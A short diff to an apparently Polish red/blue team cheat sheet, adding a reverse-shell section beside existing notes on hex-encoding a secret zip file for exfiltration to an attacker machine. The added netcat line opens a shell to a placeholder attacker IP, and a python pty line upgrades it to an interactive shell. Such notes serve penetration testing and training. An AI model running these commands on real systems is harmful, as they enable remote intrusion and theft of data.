@@ -118,6 +118,14 @@ xxd -p tajny_plik.zip > data.hex
 # Na maszynie atakującego:
 xxd -r -p data.hex > odzyskany_plik.zip
 ```
+### Reverse Shell
+```
+nc -e /bin/bash <attackbox_ip> <port>
+```
+### Interaktywny shell
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
 # Blue
 ## Ausearch
 ```
